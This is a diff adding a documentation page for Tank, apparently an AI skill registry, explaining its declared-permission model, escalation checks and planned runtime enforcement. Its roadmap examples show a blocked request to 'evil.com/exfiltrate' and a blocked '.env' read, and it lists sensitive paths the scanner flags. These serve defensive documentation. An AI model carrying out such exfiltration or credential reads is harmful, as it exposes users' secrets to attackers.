@@ -1,0 +1,465 @@
+---
+title: Permission System
+description: Deep dive into Tank's capability-based permission system
+icon: lock
+---
+
+## Overview
+
+Tank uses a **capability-based permission system** where skills must explicitly declare required capabilities in their manifest. This is inspired by:
+
+- **Deno**: Explicit `--allow-net`, `--allow-read`, etc.
+- **Android**: App permissions requested at install time
+- **Web browsers**: Permission prompts for camera, location, notifications
+
+<Warning>
+  **Current Status**: Permission declarations are validated and displayed to users at install time, but **runtime enforcement is not yet implemented**. Skills are trusted to honor their declared permissions. Runtime sandboxing is planned for Tank v2.0.
+</Warning>
+
+## Permission Categories
+
+From `packages/shared/src/schemas/permissions.ts`:
+
+```typescript
+permissionsSchema = z.object({
+  network: z.object({
+    outbound: z.array(z.string()).optional(),  // Domain allowlist
+  }).optional(),
+  filesystem: z.object({
+    read: z.array(z.string()).optional(),   // Glob patterns
+    write: z.array(z.string()).optional(),  // Glob patterns
+  }).optional(),
+  subprocess: z.boolean().optional(),
+}).strict();
+```
+
+### 1. Network Permission
+
+**Field**: `permissions.network.outbound`
+
+**Type**: `string[]` (array of domain patterns)
+
+**Purpose**: Controls which domains a skill can make HTTP/HTTPS requests to
+
+**Patterns**:
+- `"api.example.com"` — exact domain
+- `"*.example.com"` — all subdomains
+- `"*"` — all domains (discouraged, triggers warning)
+
+**Example**:
+```json
+{
+  "permissions": {
+    "network": {
+      "outbound": [
+        "api.github.com",
+        "*.openai.com",
+        "api.anthropic.com"
+      ]
+    }
+  }
+}
+```
+
+**Security Checks**:
+- Stage 2 (Static Analysis) cross-checks detected network calls vs declared domains
+- Undeclared network access → High severity finding
+
+**Runtime Enforcement** (Planned):
+- HTTP client library intercepts all requests
+- Checks destination domain against allowlist
+- Rejects request if not allowed
+
+### 2. Filesystem Permission
+
+**Fields**: `permissions.filesystem.read`, `permissions.filesystem.write`
+
+**Type**: `string[]` (array of glob patterns relative to project root)
+
+**Purpose**: Controls which files/directories a skill can access
+
+**Patterns**:
+- `"src/**/*.ts"` — all TypeScript files in src/
+- `".env"` — specific file (dangerous, triggers warning)
+- `"docs/*.md"` — all markdown files in docs/
+- `"**"` — all files (discouraged)
+
+**Example**:
+```json
+{
+  "permissions": {
+    "filesystem": {
+      "read": [
+        "src/**/*.ts",
+        "package.json",
+        "README.md"
+      ],
+      "write": [
+        "build/**",
+        "dist/**"
+      ]
+    }
+  }
+}
+```
+
+**Security Checks**:
+- Stage 2 (Static Analysis) flags hardcoded sensitive paths (`.ssh`, `.aws`, `.env`)
+- Stage 4 (Secrets) flags attempts to read credentials
+
+**Runtime Enforcement** (Planned):
+- File system operations intercepted
+- Path matched against glob patterns
+- Rejects access if not allowed
+
+### 3. Subprocess Permission
+
+**Field**: `permissions.subprocess`
+
+**Type**: `boolean`
+
+**Purpose**: Controls whether skill can spawn child processes
+
+**Default**: `false`
+
+**Example**:
+```json
+{
+  "permissions": {
+    "subprocess": true
+  }
+}
+```
+
+<Warning>
+  **Subprocess permission is extremely dangerous.** Granting this allows a skill to run arbitrary commands. Most skills should NOT need this.
+</Warning>
+
+**Security Checks**:
+- Stage 2 (Static Analysis) detects subprocess usage (`subprocess.run`, `child_process.exec`, `os.system`)
+- If code uses subprocesses but `subprocess: false` → High severity finding
+
+**Runtime Enforcement** (Planned):
+- `subprocess` module patched to check permission
+- Throws error if permission not granted
+
+---
+
+## Permission Declaration
+
+Permissions are declared in `SKILL.md` frontmatter (parsed at publish time):
+
+```markdown
+---
+name: my-skill
+version: 1.0.0
+description: Example skill
+permissions:
+  network:
+    outbound:
+      - api.github.com
+  filesystem:
+    read:
+      - src/**/*.ts
+  subprocess: false
+---
+
+# My Skill
+
+Skill documentation here...
+```
+
+Alternatively, in `package.json` (if using npm-style packaging):
+
+```json
+{
+  "name": "my-skill",
+  "version": "1.0.0",
+  "tank": {
+    "permissions": {
+      "network": {
+        "outbound": ["api.github.com"]
+      },
+      "filesystem": {
+        "read": ["src/**/*.ts"]
+      },
+      "subprocess": false
+    }
+  }
+}
+```
+
+---
+
+## Permission Escalation Detection
+
+When publishing a new version of a skill, Tank compares permissions vs the previous version.
+
+From `apps/web/lib/permission-escalation.ts`:
+
+```typescript
+export function detectPermissionEscalation(
+  oldPerms: Permissions,
+  newPerms: Permissions,
+  oldVersion: string,
+  newVersion: string
+): PermissionEscalation | null {
+  const changes = comparePermissions(oldPerms, newPerms);
+  
+  if (changes.length === 0) {
+    return null;  // No permission changes
+  }
+  
+  // Parse versions
+  const oldSemver = semver.parse(oldVersion);
+  const newSemver = semver.parse(newVersion);
+  
+  // If MAJOR version bumped, escalation is allowed
+  if (newSemver.major > oldSemver.major) {
+    return null;
+  }
+  
+  // If MINOR or PATCH, permission escalation is NOT allowed
+  return {
+    changes,
+    recommendedAction: "Bump major version",
+    severity: "high",
+  };
+}
+```
+
+### Rules
+
+| Old Version | New Version | Permission Change | Allowed? |
+|-------------|-------------|-------------------|----------|
+| 1.0.0 | 1.1.0 | Added `network.outbound` | ❌ (minor bump, must be 2.0.0) |
+| 1.0.0 | 2.0.0 | Added `network.outbound` | ✅ (major bump) |
+| 1.0.0 | 1.0.1 | None | ✅ (patch is OK) |
+| 1.0.0 | 1.1.0 | Removed a permission | ✅ (reduction is safe) |
+
+**Why?** Semver contract: minor/patch versions should be backwards-compatible. New permissions = potential breakage for consumers who didn't expect network access.
+
+---
+
+## Install-Time User Review
+
+When a user runs `tank install my-skill`, the CLI displays:
+
+```bash
+$ tank install github-pr-analyzer
+
+📦 github-pr-analyzer@1.2.0
+🔒 Security Score: 8/10
+
+⚠️  This skill requires the following permissions:
+
+  Network:
+    • api.github.com
+    • *.githubusercontent.com
+  
+  Filesystem (read):
+    • .git/config
+    • src/**/*.ts
+  
+  Subprocess: false
+
+🔍 Security findings (2 medium):
+  • [medium] High-entropy string detected in config.ts:42
+  • [medium] Unpinned dependency: requests
+
+Continue? (y/N)
+```
+
+User must explicitly approve before installation proceeds.
+
+---
+
+## Audit Score Impact
+
+From `apps/web/lib/audit-score.ts`, permissions affect the 0-10 score:
+
+**Check 3: Permissions Declared** (+1 point)
+- Passes if `permissions` object is non-empty
+- Fails if `permissions = {}` or missing
+
+**Why?** Skills that don't declare permissions are suspicious — they either:
+1. Don't need any capabilities (unlikely)
+2. Forgot to declare (incomplete manifest)
+3. Intentionally hiding capabilities (malicious)
+
+**Check 5: Permission Extraction Match** (+2 points)
+- Stage 2 (Static Analysis) extracts permissions from code (e.g., detects `fetch()` calls)
+- Compares extracted vs declared
+- Passes if extracted ⊆ declared
+- Fails if code uses undeclared capabilities
+
+---
+
+## CLI Command: `tank permissions`
+
+View permissions for an installed skill:
+
+```bash
+$ tank permissions github-pr-analyzer
+
+github-pr-analyzer@1.2.0
+
+Network:
+  Outbound:
+    • api.github.com
+    • *.githubusercontent.com
+
+Filesystem:
+  Read:
+    • .git/config
+    • src/**/*.ts
+  Write:
+    (none)
+
+Subprocess: false
+```
+
+View diff between two versions:
+
+```bash
+$ tank permissions github-pr-analyzer --compare 1.1.0 1.2.0
+
++ Network.outbound: *.githubusercontent.com
++ Filesystem.read: src/**/*.ts
+```
+
+---
+
+## Default Permissions
+
+From `packages/shared/src/constants/permissions.ts`:
+
+```typescript
+export const DEFAULT_PERMISSIONS = {
+  network: undefined,
+  filesystem: undefined,
+  subprocess: false,
+};
+```
+
+**Principle**: Default-deny. Skills must opt-in to capabilities.
+
+---
+
+## Permission Categories Reference
+
+| Category | Default | Description | Enforcement Status |
+|----------|---------|-------------|-----------|
+| `network.outbound` | `undefined` (deny all) | HTTP/HTTPS requests to specific domains | Planned (v2.0) |
+| `filesystem.read` | `undefined` (deny all) | Read access to files/directories | Planned (v2.0) |
+| `filesystem.write` | `undefined` (deny all) | Write access to files/directories | Planned (v2.0) |
+| `subprocess` | `false` | Ability to spawn child processes | Planned (v2.0) |
+
+---
+
+## Best Practices for Skill Authors
+
+### 1. Principle of Least Privilege
+
+Only request permissions you actually need.
+
+**Bad**:
+```json
+{
+  "permissions": {
+    "network": { "outbound": ["*"] },
+    "filesystem": { "read": ["**"] },
+    "subprocess": true
+  }
+}
+```
+
+**Good**:
+```json
+{
+  "permissions": {
+    "network": { "outbound": ["api.github.com"] },
+    "filesystem": { "read": ["src/**/*.ts"] }
+  }
+}
+```
+
+### 2. Be Specific with Domains
+
+Avoid wildcards unless necessary.
+
+**OK**: `"*.github.com"` (GitHub has many subdomains)
+
+**Bad**: `"*"` (all domains)
+
+### 3. Explain in README
+
+Document WHY your skill needs each permission.
+
+```markdown
+## Required Permissions
+
+- **Network**: `api.github.com` - Fetches pull request data
+- **Filesystem (read)**: `src/**/*.ts` - Analyzes TypeScript source files
+```
+
+### 4. Avoid Subprocess
+
+Most skills should NOT spawn processes. If you must, explain why.
+
+### 5. Version Bumps for New Permissions
+
+If adding a new permission, bump the MAJOR version (e.g., 1.2.0 → 2.0.0).
+
+---
+
+## Runtime Enforcement Roadmap (v2.0)
+
+**Planned Implementation**:
+
+1. **Interceptor Layer**: Patch Node.js/Python built-ins at skill import time
+2. **Permission Checks**: Before each operation, check against declared permissions
+3. **Denial Handling**: Throw `PermissionDeniedError` with helpful message
+
+**Example** (Python):
+```python
+import httpx
+
+# Skill declared: permissions.network.outbound = ["api.github.com"]
+
+# Allowed:
+response = httpx.get("https://api.github.com/repos/...")
+
+# Denied (throws PermissionDeniedError):
+response = httpx.get("https://evil.com/exfiltrate")
+# → PermissionDeniedError: Skill 'my-skill' attempted to access 'evil.com'
+#                          but only declared: ['api.github.com']
+```
+
+**Example** (TypeScript):
+```typescript
+import fs from 'fs';
+
+// Skill declared: permissions.filesystem.read = ["src/**/*.ts"]
+
+// Allowed:
+const code = fs.readFileSync('src/main.ts', 'utf-8');
+
+// Denied:
+const secrets = fs.readFileSync('.env', 'utf-8');
+// → PermissionDeniedError: Skill 'my-skill' attempted to read '.env'
+//                          but only declared: ['src/**/*.ts']
+```
+
+---
+
+## Next Steps
+
+<CardGroup cols={2}>
+  <Card title="Audit Score" icon="star" href="/security/audit-score">
+    How permissions affect the 0-10 score
+  </Card>
+  <Card title="Best Practices" icon="book" href="/security/best-practices">
+    Security guidelines for skill authors
+  </Card>
+</CardGroup>
